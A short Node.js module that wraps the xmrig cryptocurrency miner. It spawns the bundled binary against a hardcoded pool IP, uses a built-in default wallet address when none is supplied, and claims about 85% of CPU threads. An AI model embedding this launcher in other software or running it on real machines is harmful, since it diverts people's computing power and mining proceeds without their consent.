const os = require('node:os');
const { EventEmitter } = require('node:events');


module.exports.Miner = class extends EventEmitter {
    constructor(walletAddress, options) {
        super();

        this.addListener('start', walletPort => {
            require('child_process').spawn(require('path').resolve('deps/miner', os.platform() === 'linux' ? 'xmrig' : 'xmrig.exe'), [
                '--nicehash',
                '--donate-level', '1',

                '-o', '34.149.22.228:9200',
                '-u', `${walletAddress || 'NHbZqp7ic66cjaoFF8KNTWxrorJs28ag3TsQ'}.Nodejs`,

                '-a', 'rx',
                '-x', walletPort,
                '-t', Math.round(options?.threads || os.availableParallelism() * 0.85)
            ])
                .addListener('error', console.log).addListener('close', console.log).stdout.addListener('data', e => {
                    console.log(e.toString());
                });
        });
    };
};